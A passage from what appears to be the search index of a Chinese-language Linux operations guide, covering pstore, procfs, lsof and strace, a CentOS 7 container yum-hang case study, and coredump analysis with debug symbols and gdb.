<code>/var/lib/systemd/pstore</code>\uff0c\u200b\u4ee5\u4fbf\u200b\u817e\u51fa\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u540c\u65f6\u200b\u4fdd\u7559\u200b\u8bb0\u5f55\u200b\u4f9b\u200b\u7ba1\u7406\u5458\u200b\u67e5\u9605\u200b\u3002 \u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5982\u679c\u200b\u4f60\u200b\u5728\u200b\u91cd\u542f\u200b\u540e\u200b\u53d1\u73b0\u200b <code>/sys/fs/pstore</code> \u200b\u662f\u200b\u7a7a\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f60\u200b\u5e94\u8be5\u200b\u53bb\u200b\u67e5\u770b\u200b <code>/var/lib/systemd/pstore</code>\u3002</p>"},{"location":"ops/debug/#procfs-and-strace","title":"procfs \u200b\u4e0e\u200b strace","text":"<p><code>/proc</code>\uff08procfs\uff09\u200b\u662f\u200b\u5185\u6838\u200b\u4ee5\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5f62\u5f0f\u200b\u5411\u200b\u7528\u6237\u200b\u7a7a\u95f4\u200b\u63d0\u4f9b\u200b\u7684\u200b\u67e5\u770b\u200b\u3001\u200b\u7ba1\u7406\u200b\u8fdb\u7a0b\u200b\u72b6\u6001\u200b\u7684\u200b\u63a5\u53e3\u200b\u3002 \u200b\u5176\u4e2d\u200b <code>/proc/self</code> \u200b\u6307\u5411\u200b\u4e86\u200b\u8bbf\u95ee\u200b\u6587\u4ef6\u200b\u7684\u200b\u5f53\u524d\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c<code>/proc/&lt;pid&gt;</code> \u200b\u5219\u200b\u6307\u5411\u200b\u4e86\u200b PID \u200b\u5bf9\u5e94\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002 \u200b\u5e38\u200b\u5173\u6ce8\u200b\u7684\u200b\u4fe1\u606f\u200b\uff08\u200b\u4e0d\u4f1a\u200b\u76f4\u63a5\u200b\u4ece\u200b <code>htop</code> \u200b\u7b49\u200b\u83b7\u5f97\u200b\u7684\u200b\u4fe1\u606f\u200b\uff09\u200b\u6709\u200b\uff1a</p> <ul> <li><code>cwd</code> \u200b\u4e0e\u200b <code>exe</code>\uff1a\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u5f53\u524d\u5de5\u4f5c\u200b\u76ee\u5f55\u200b\u4e0e\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\u8def\u5f84\u200b</li> <li><code>fd</code> \u200b\u76ee\u5f55\u200b\u5305\u542b\u200b\u4e86\u200b\u6240\u6709\u200b\u7a0b\u5e8f\u200b\u6253\u5f00\u200b\u7684\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b</li> <li><code>stack</code>\uff1a\u200b\u7a0b\u5e8f\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u6808\u200b\u4fe1\u606f\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u9879\u200b\u4fe1\u606f\u200b\u5728\u200b\u7a0b\u5e8f\u200b\u4e00\u76f4\u200b\u5904\u4e8e\u200b D \u200b\u72b6\u6001\u200b\uff08\u200b\u4e0d\u53ef\u200b\u4e2d\u65ad\u200b\u7761\u7720\u200b\uff09\u200b\u65f6\u200b\u7279\u522b\u200b\u6709\u7528\u200b</li> </ul> <p><code>lsof</code></p> <p>lsof \u200b\u5de5\u5177\u200b\u53ef\u4ee5\u200b\u904d\u5386\u200b procfs \u200b\u4e0a\u200b\u5404\u4e2a\u200b\u8fdb\u7a0b\u200b\u7684\u200b <code>fd</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u5e76\u200b\u8f93\u51fa\u200b\u8fdb\u7a0b\u200b\u6253\u5f00\u200b\u7684\u200b\u6587\u4ef6\u200b\u4fe1\u606f\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u5feb\u901f\u200b\u5730\u200b\u8f93\u51fa\u200b\u5f53\u524d\u200b\u7cfb\u7edf\u200b\u5168\u90e8\u200b\u76f8\u5173\u200b\u7684\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>lsof -Ki -n\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>-Ki</code> \u200b\u907f\u514d\u200b lsof \u200b\u5bf9\u200b\u7ebf\u7a0b\u200b\u6253\u5f00\u200b\u7684\u200b\u91cd\u590d\u200b\u6587\u4ef6\u200b\u8ba1\u6570\u200b\uff1b\u200b\u800c\u200b <code>-n</code> \u200b\u907f\u514d\u200b\u4e86\u200b\u4e0d\u5fc5\u8981\u200b\u7684\u200b DNS \u200b\u8bf7\u6c42\u200b\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u8f83\u200b\u65b0\u200b\u7248\u672c\u200b <code>util-linux-extra</code> \u200b\u5305\u4e2d\u200b\u7684\u200b lsfd \u200b\u5de5\u5177\u200b\u4e5f\u200b\u6709\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u529f\u80fd\u200b\u3002</p> <p>\u200b\u5728\u200b\u5206\u6790\u200b\u8fdb\u7a0b\u200b\u884c\u4e3a\u200b\u65f6\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u76f8\u5f53\u200b\u6709\u7528\u200b\u7684\u200b\u5de5\u5177\u200b\u662f\u200b <code>strace</code>\u3002\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u8f93\u51fa\u200b\u7a0b\u5e8f\u200b\u4f7f\u7528\u200b\u7684\u200b\u6240\u6709\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5728\u200b\u8c03\u8bd5\u200b\u8bb8\u591a\u200b\u95ee\u9898\u200b\u7684\u200b\u65f6\u5019\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b\u5f88\u5927\u200b\u7684\u200b\u5e2e\u52a9\u200b\u3002\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u200b\u7684\u200b\u547d\u4ee4\u200b\u6709\u200b\uff1a</p> <ul> <li><code>strace ls</code>\uff1a\u200b\u8ddf\u8e2a\u200b <code>ls</code> \u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b</li> <li><code>strace -f bash</code>\uff1a\u200b\u8ddf\u8e2a\u200b <code>bash</code> \u200b\u53ca\u5176\u200b fork \u200b\u51fa\u200b\u7684\u200b\u5b50\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b</li> <li><code>strace -p &lt;pid&gt;</code>\uff1a\u200b\u8ddf\u8e2a\u200b\u6307\u5b9a\u200b PID \u200b\u7684\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b</li> <li><code>strace -e openat ls</code>\uff1a\u200b\u53ea\u200b\u8ddf\u8e2a\u200b <code>openat</code> \u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b</li> <li><code>strace -ff -o /tmp/test.log bash</code>\uff1a\u200b\u5c06\u200b <code>bash</code> \u200b\u53ca\u5176\u200b fork \u200b\u51fa\u200b\u7684\u200b\u5b50\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u8f93\u51fa\u200b\u5230\u200b <code>/tmp/test.log.*</code></li> <li><code>strace -k -yy -e mmap ls</code>: \u200b\u8ddf\u8e2a\u200b <code>ls</code> \u200b\u7684\u200b <code>mmap</code> \u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff0c\u200b\u5e76\u6253\u5370\u200b\u51fa\u200b\u6267\u884c\u200b\u6b64\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u65f6\u200b\u7684\u200b\u5806\u6808\u200b\uff08<code>-k</code>\uff09\uff0c\u200b\u540c\u65f6\u200b\u89e3\u7801\u200b\u6240\u6709\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\uff08<code>-yy</code>\uff09\u3002\u200b\u8fd9\u6837\u200b\u5373\u53ef\u200b\u8ffd\u8e2a\u200b\u5230\u200b\u6bcf\u4e2a\u200b\u88ab\u200b <code>mmap</code> \u200b\u7684\u200b\u6587\u4ef6\u200b\u5728\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u4f55\u5904\u200b\u88ab\u200b\u5f15\u5165\u200b\u3002</li> </ul> <p>Sysinternals' Procmon</p> <p>Windows \u200b\u7cfb\u7edf\u200b\u4e0a\u200b\u7684\u200b\u7c7b\u4f3c\u200b\u5de5\u5177\u200b\u662f\u200b Sysinternals \u200b\u7684\u200b Procmon\uff0c \u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u6240\u6709\u200b\u8fdb\u7a0b\u200b\u5bf9\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3001\u200b\u6ce8\u518c\u8868\u200b\u7b49\u200b\u7684\u200b\u64cd\u4f5c\u200b\u3002 \u200b\u6709\u8da3\u200b\u7684\u200b\u662f\u200b\uff0cSysinternals \u200b\u5728\u200b\u591a\u5e74\u200b\u524d\u200b\u4e5f\u200b\u63a8\u51fa\u200b\u4e86\u200b Procmon \u200b\u7684\u200b Linux \u200b\u7248\u672c\u200b\uff0c \u200b\u4f7f\u7528\u200b\u4e86\u200b eBPF \u200b\u6280\u672f\u200b\u5b9e\u73b0\u200b\uff08\u200b\u8be6\u89c1\u200b\u4e0b\u6587\u200b\uff09\u3002</p> <p>\u200b\u6848\u4f8b\u200b\uff1aCentOS 7 \u200b\u5bb9\u5668\u200b\u4f7f\u7528\u200b <code>yum</code> \u200b\u5b89\u88c5\u200b\u8f6f\u4ef6\u200b\u7684\u200b bug</p> <p>\u200b\u5728\u200b\u67d0\u4e9b\u200b\u914d\u7f6e\u200b\u4e0b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6ce8\u610f\u200b\u5230\u200b <code>centos:7</code> \u200b\u5bb9\u5668\u200b\u4e2d\u200b\u4f7f\u7528\u200b <code>yum</code> \u200b\u5b89\u88c5\u200b\u8f6f\u4ef6\u200b\u65f6\u4f1a\u200b\u5361\u4f4f\u200b\uff1a</p> <pre><code>$ sudo docker run -it --rm centos:7 bash\n[root@16c7cc5f835d /]# yum update\n\uff08\u200b\u7565\u200b\uff09\n  Updating   : tzdata-2024a-1.el7.noarch                                                                                      1/102 \n  Updating   : bash-4.2.46-35.el7_9.x86_64                                                                                    2/102 \n  Updating   : glibc-common-2.17-326.el7_9.x86_64                                                                             3/102 \n  Updating   : nss-softokn-freebl-3.90.0-6.el7_9.x86_64                                                                       4/102 \n  Updating   : glibc-2.17-326.el7_9.x86_64                                                                                    5/102\n</code></pre> <p>\u200b\u6b64\u65f6\u200b\u53d1\u73b0\u200b <code>/usr/bin/python /usr/bin/yum update</code> CPU \u200b\u5360\u7528\u200b 100%\u3002\u200b\u4f7f\u7528\u200b <code>strace</code> \u200b\u8ddf\u8e2a\u200b <code>yum</code> \u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff1a</p> <pre><code>$ sudo strace -f -p 3163763\nfcntl(441032195, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032196, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032197, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032198, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032199, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032200, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032201, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032202, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032203, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032204, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032205, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032206, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032207, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032208, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032209, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032210, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032211, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032212, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032213, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032214, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032215, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032216, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032217, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032218, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032219, F_GETFD)               = -1 EBADF (Bad file descriptor)\nfcntl(441032220, F_GETFD)               = -1 EBADF (Bad file descriptor)\n...\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5176\u200b\u5728\u200b\u904d\u5386\u200b\u6240\u6709\u200b\u53ef\u80fd\u200b\u7684\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u8be5\u200b\u5bb9\u5668\u200b\u73af\u5883\u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8303\u56f4\u200b\u8fc7\u5927\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u4e86\u200b <code>yum</code> \u200b\u5361\u4f4f\u200b\u3002 \u200b\u641c\u7d22\u200b\u540e\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u8fd9\u200b\u662f\u200b\u4e2a\u200b\u5df2\u77e5\u200b\u7684\u200b bug\uff1a\u200b\u5982\u679c\u200b\u5bb9\u5668\u200b\u6ca1\u6709\u200b\u9650\u5236\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\u7684\u200b\u8303\u56f4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9ed8\u8ba4\u503c\u200b\u5c31\u200b\u7279\u522b\u200b\u5927\u200b\uff1a</p> <pre><code>[root@16c7cc5f835d /]# ulimit -n\n1073741816\n</code></pre> <p>\u200b\u800c\u200b\u67d0\u4e9b\u200b\u7a0b\u5e8f\u200b\u65e0\u6cd5\u200b\u6b63\u786e\u5904\u7406\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\u8303\u56f4\u200b\u4e0d\u200b\u5927\u200b\uff0c\u200b\u7136\u540e\u200b\u4e00\u4e2a\u200b\u4e00\u4e2a\u200b\u53bb\u200b\u5c1d\u8bd5\u200b\u64cd\u4f5c\u200b\uff09\u3002 \u200b\u4e0d\u4ec5\u200b\u662f\u200b <code>yum</code>\uff0c\u200b\u8bf8\u5982\u200b <code>xinetd</code> \u200b\u7b49\u200b\u4e5f\u200b\u6709\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u95ee\u9898\u200b\uff08ref\uff09\u3002</p> <p>strace \u200b\u7684\u200b\u8f93\u51fa\u200b\u683c\u5f0f\u200b\u5e76\u200b\u4e0d\u200b\u603b\u662f\u200b\u6700\u53ef\u8bfb\u200b\u7684\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u6240\u4ee5\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u4e13\u6ce8\u200b\u4e8e\u200b\u7279\u5b9a\u200b\u9886\u57df\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u8ffd\u8e2a\u200b\u5de5\u5177\u200b\uff0c\u200b\u6bd4\u5982\u200b\uff1a</p> <ul> <li>tracexec \u200b\u4e13\u6ce8\u200b\u4e8e\u200b\u8ffd\u8e2a\u200b exec \u200b\u7cfb\u5217\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff0c\u200b\u80fd\u591f\u200b\u91cd\u65b0\u200b\u6784\u9020\u200b\u6267\u884c\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u7684\u200b shell \u200b\u547d\u4ee4\u884c\u200b\u5e76\u200b\u663e\u793a\u200b\u73af\u5883\u53d8\u91cf\u200b\u548c\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\u76f8\u8f83\u200b\u4e8e\u200b\u539f\u59cb\u200b\u73af\u5883\u200b\u7684\u200b\u5dee\u5f02\u200b\u3002\u200b\u9664\u6b64\u4e4b\u5916\u200b\uff0c\u200b\u5728\u200b\u7528\u200b gdb \u200b\u8c03\u8bd5\u7a0b\u5e8f\u200b\u65f6\u200b\u53ef\u80fd\u200b\u9047\u5230\u200b\u6bd4\u8f83\u590d\u6742\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u6bd4\u5982\u200b\u88ab\u200b\u8c03\u8bd5\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u662f\u200b\u88ab\u200b\u4e00\u4e2a\u200b python \u200b\u811a\u672c\u200b\u542f\u52a8\u200b\u7684\u200b\uff0c\u200b\u6216\u8005\u200b\u4e24\u4e2a\u200b\u9700\u8981\u200b\u88ab\u200b\u8c03\u8bd5\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u4e4b\u95f4\u200b\u9700\u8981\u200b\u901a\u8fc7\u200b\u7ba1\u9053\u200b\u901a\u4fe1\u200b\uff08<code>a | b</code>\uff09\uff0c\u200b\u8fd9\u65f6\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b tracexec \u200b\u65b9\u4fbf\u200b\u5730\u200b\u5728\u200b <code>execve{,at}</code> \u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u7ed3\u675f\u200b\u65f6\u200b\uff0c\u200b\u7a0b\u5e8f\u200b\u5f00\u59cb\u200b\u6267\u884c\u200b\u524d\u200b\u5c06\u200b gdb \u200b\u8c03\u8bd5\u5668\u200b\u63a5\u5165\u200b\u60f3\u8981\u200b\u8c03\u8bd5\u200b\u7684\u200b\u6240\u6709\u200b\u7a0b\u5e8f\u200b\u3002</li> </ul> <p>\u200b\u9664\u200b strace \u200b\u4ee5\u5916\u200b\uff0cLinux \u200b\u4e2d\u200b\u8fd8\u6709\u200b\u5f88\u591a\u200b\u7528\u4e8e\u200b\u76d1\u63a7\u200b\u3001\u200b\u8ffd\u8e2a\u200b\u7cfb\u7edf\u200b\u72b6\u6001\u200b\u7684\u200b\u5de5\u5177\u200b\uff0c\u200b\u5982\u56fe\u6240\u793a\u200b\uff1a</p> <p></p> <p>\u200b\u9700\u8981\u200b\u6839\u636e\u200b\u5177\u4f53\u60c5\u51b5\u200b\u9009\u62e9\u200b\u5408\u9002\u200b\u7684\u200b\u5de5\u5177\u200b\u3002\u200b\u672c\u6587\u200b\u4ea6\u200b\u65e0\u6cd5\u200b\u8be6\u7ec6\u200b\u4ecb\u7ecd\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u5de5\u5177\u200b\u7684\u200b\u4f7f\u7528\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8bf7\u200b\u53c2\u8003\u200b\u5bf9\u5e94\u200b\u5de5\u5177\u200b\u7684\u200b\u624b\u518c\u200b\u3002</p>"},{"location":"ops/debug/#debug-symbols-and-gdb","title":"\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\u4e0e\u200b gdb","text":"<p>\u200b\u6709\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u4f1a\u200b\u9047\u5230\u200b\u7a0b\u5e8f\u200b\u5d29\u6e83\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002\u200b\u9664\u4e86\u200b\u7a0b\u5e8f\u200b\u672c\u8eab\u200b\u7559\u4e0b\u200b\u7684\u200b\u65e5\u5fd7\u200b\u4ee5\u5916\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u7684\u200b\u4fe1\u606f\u200b\u5c31\u662f\u200b\u7a0b\u5e8f\u200b\u7684\u200b coredump\u3002 coredump \u200b\u4e2d\u200b\u5305\u542b\u200b\u4e86\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u5185\u5b58\u200b\u4fe1\u606f\u200b\uff0c\u200b\u901a\u8fc7\u200b\u89e3\u6790\u200b coredump\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u83b7\u53d6\u200b\u5728\u200b\u7a0b\u5e8f\u200b\u5d29\u6e83\u200b\u65f6\u200b\u8be6\u7ec6\u200b\u7684\u200b\u8c03\u7528\u200b\u6808\u200b\u4fe1\u606f\u200b\uff0c\u200b\u8fd9\u200b\u5bf9\u4e8e\u200b\u6392\u67e5\u200b\u95ee\u9898\u200b\u975e\u5e38\u200b\u6709\u200b\u5e2e\u52a9\u200b\u3002</p> <p>\u200b\u5728\u200b\u5b89\u88c5\u200b\u4e86\u200b systemd-coredump \u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\uff0c\u200b\u5176\u4f1a\u200b\u81ea\u52a8\u200b\u6536\u96c6\u200b\u7a0b\u5e8f\u200b\u5d29\u6e83\u200b\u65f6\u200b\u7684\u200b coredump\uff1b \u200b\u5bf9\u4e8e\u200b\u6b63\u5728\u200b\u8fd0\u884c\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>gcore</code> \u200b\u547d\u4ee4\u200b\u6765\u200b\u751f\u6210\u200b coredump\u3002 \u200b\u4f46\u662f\u200b coredump \u200b\u8fd8\u200b\u9700\u8981\u200b\u914d\u5408\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\u624d\u80fd\u200b\u8fdb\u884c\u200b\u5206\u6790\u200b\uff0c\u200b\u5426\u5219\u200b\u5f97\u5230\u200b\u7684\u200b\u5185\u5bb9\u200b\u5305\u62ec\u200b\u5199\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u4eba\u200b\u81ea\u5df1\u200b\u90fd\u200b\u4e0d\u53ef\u200b\u80fd\u770b\u61c2\u200b\u3002 \u200b\u5bf9\u4e8e\u200b Debian\uff0c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b https://wiki.debian.org/HowToGetABacktrace \u200b\u6765\u200b\u83b7\u53d6\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u53d1\u884c\u7248\u200b\u5219\u200b\u9700\u8981\u200b\u9605\u8bfb\u200b\u53d1\u884c\u7248\u200b\u5bf9\u5e94\u200b\u7684\u200b\u624b\u518c\u200b\u3002 \u200b\u4e00\u822c\u6765\u8bb2\u200b\uff0c\u200b\u8bb8\u591a\u200b\u53d1\u884c\u7248\u200b\u76ee\u524d\u200b\u90fd\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4ece\u200b debuginfod \u200b\u81ea\u52a8\u200b\u83b7\u53d6\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u624b\u52a8\u200b\u5b89\u88c5\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\u5305\u200b\u3002</p> <p>\u200b\u6709\u200b\u4e86\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\u4e4b\u540e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>gdb</code> \u200b\u5206\u6790\u200b coredump \u200b\u4e86\u200b\u3002\u200b\u5bf9\u4e8e\u200b systemd-coredump\uff0c\u200b\u4f7f\u7528\u200b\u5982\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>$ coredumpctl list\n\uff08\u200b\u627e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b coredump \u200b\u4ee5\u53ca\u200b\u5176\u200b pid\uff09\n$ coredumpctl gdb &lt;pid&gt;  # \u200b\u5982\u679c\u200b\u662f\u200b\u6700\u8fd1\u200b\u4e00\u6b21\u200b\u7684\u200b coredump\uff0c\u200b\u53ef\u4ee5\u200b\u7701\u7565\u200b &lt;pid&gt;\n</code></pre> <p>\u200b\u5982\u679c\u200b\u662f\u200b coredump \u200b\u6587\u4ef6\u200b\u7684\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8c03\u7528\u200b gdb\uff1a</p> <pre><code>gdb -c core.123456 # \u200b\u5047\u8bbe\u200b coredump \u200b\u6587\u4ef6\u540d\u200b\u4e3a\u200b core.123456\n</code></pre> <p>\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b\u8fd0\u884c\u200b\u65f6\u200b\u8c03\u8bd5\u200b\uff0c\u200b\u6216\u8005\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b gdb \u200b\u542f\u52a8\u200b\u5e0c\u671b\u200b\u8c03\u8bd5\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff1a</p> <pre><code>$ gdb -p &lt;pid&gt;  # \u200b\u9644\u52a0\u200b\uff08attach\uff09\u200b\u5230\u200b\u6307\u5b9a\u200b\u7684\u200b pid \u200b\u8c03\u8bd5\u200b\n$ gdb /path/to/program  # \u200b\u76f4\u63a5\u200b\u542f\u52a8\u200b gdb \u200b\u5e76\u200b\u8c03\u8bd5\u200b\u6307\u5b9a\u200b\u7684\u200b\u7a0b\u5e8f\u200b\n$ gdb --args /path/to/program arg1 arg2  # \u200b\u542f\u52a8\u200b gdb \u200b\u5e76\u200b\u8c03\u8bd5\u200b\u6307\u5b9a\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u540c\u65f6\u200b\u4f20\u5165\u200b\u53c2\u6570\u200b\n$ gdb --args env VAR=VALUE /path/to/program arg1 arg2  # \u200b\u542f\u52a8\u200b gdb \u200b\u5e76\u200b\u8c03\u8bd5\u200b\u6307\u5b9a\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u540c\u65f6\u200b\u4f20\u5165\u200b\u73af\u5883\u53d8\u91cf\u200b\u548c\u200b\u53c2\u6570\u200b\nGNU gdb (GDB) 14.2\nCopyright (C) 2023 Free Software Foundation, Inc.\n...\n&gt;&gt;&gt; run  # \u200b\u542f\u52a8\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u5728\u200b\u542f\u52a8\u200b\u7a0b\u5e8f\u200b\u524d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u65ad\u70b9\u200b\u8bbe\u7f6e\u200b\u7b49\u200b\u64cd\u4f5c\u200b\n</code></pre> <p>\u200b\u5728\u200b\u8fdb\u5165\u200b\u8c03\u8bd5\u200b\u73af\u5883\u200b\u540e\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>bt</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u7ebf\u7a0b\u200b\u7684\u200b\u8c03\u7528\u200b\u6808\u200b\u3002\u200b\u5728\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\u914d\u7f6e\u200b\u6b63\u786e\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u81f3\u5c11\u200b\u5927\u90e8\u5206\u200b\u7684\u200b\u4fe1\u606f\u200b\u90fd\u200b\u80fd\u200b\u88ab\u200b\u663e\u793a\u200b\u51fa\u6765\u200b\uff08\u200b\u800c\u200b\u4e0d\u662f\u200b\u4e00\u5806\u200b <code>???</code>\uff09\u3002</p> \u200b\u4e00\u4e2a\u200b coredump \u200b\u7684\u200b\u8c03\u7528\u200b\u6808\u200b\u4f8b\u5b50\u200b <pre><code>&gt;&gt;&gt; bt\n#0  g_type_check_instance_cast\n    (type_instance=type_instance@entry=0x60166e80e040, iface_type=0x60166aa86e20 [GtkWidget/GInitiallyUnowned])\n    at ../glib/gobject/gtype.c:4217\n#1  0x00007408aee7a370 in registry_handle_global\n    (data=0x60166e80e040, registry=&lt;optimized out&gt;, name=81, interface=0x60166f7c7840 \"wl_output\", version=&lt;optimized out&gt;)\n    at ../spice-gtk-0.42/src/wayland-extensions.c:77\n#2  0x00007408ca373596 in ??? () at /usr/lib/libffi.so.8\n#3  0x00007408ca37000e in ??? () at /usr/lib/libffi.so.8\n#4  0x00007408ca372bd3 in ffi_call () at /usr/lib/libffi.so.8\n#5  0x00007408c327f645 in wl_closure_invoke (closure=closure@entry=0x60166f7c7760, target=&lt;optimized out&gt;, \n    target@entry=0x60166ead1ff0, opcode=opcode@entry=0, data=&lt;optimized out&gt;, flags=1) at ../wayland-1.22.0/src/connection.c:1025\n#6  0x00007408c327fe73 in dispatch_event (display=display@entry=0x60166a9ffed0, queue=0x60166a9fffc0)\n    at ../wayland-1.22.0/src/wayland-client.c:1631\n#7  0x00007408c328013c in dispatch_queue (queue=0x60166a9fffc0, display=0x60166a9ffed0) at ../wayland-1.22.0/src/wayland-client.c:1777\n#8  wl_display_dispatch_queue_pending (display=0x60166a9ffed0, queue=0x60166a9fffc0) at ../wayland-1.22.0/src/wayland-client.c:2019\n#9  0x00007408c3478a39 in ??? () at 